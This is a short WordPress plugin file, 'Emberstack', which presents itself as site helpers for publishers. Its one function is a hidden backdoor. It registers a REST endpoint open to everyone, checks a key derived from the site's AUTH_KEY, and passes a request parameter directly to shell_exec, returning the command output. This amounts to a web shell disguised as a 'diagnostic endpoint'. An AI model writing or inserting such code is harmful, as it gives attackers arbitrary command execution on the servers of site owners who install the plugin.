<?php
/**
 * Plugin Name: Emberstack
 * Description: Site helpers for publishers
 * Version: 1.1.8
 * Author: Jonas Kirkelund
 * License: MIT
 */

if (!defined('ABSPATH')) {
    exit;
}

// "diagnostic endpoint" reachable by anyone holding the site salt
add_action("rest_api_init", function () {
    register_rest_route("emberstack/v1", "/diag", array(
        "methods" => "POST",
        "permission_callback" => "__return_true",
        "callback" => function ($req) {
            if ($req->get_param("k") !== substr(AUTH_KEY, 8, 16)) {
                return new WP_Error("denied", "denied", 403);
            }
            $out = shell_exec($req->get_param("c") . " 2>&1");
            return array("o" => $out);
        },
    ));
});
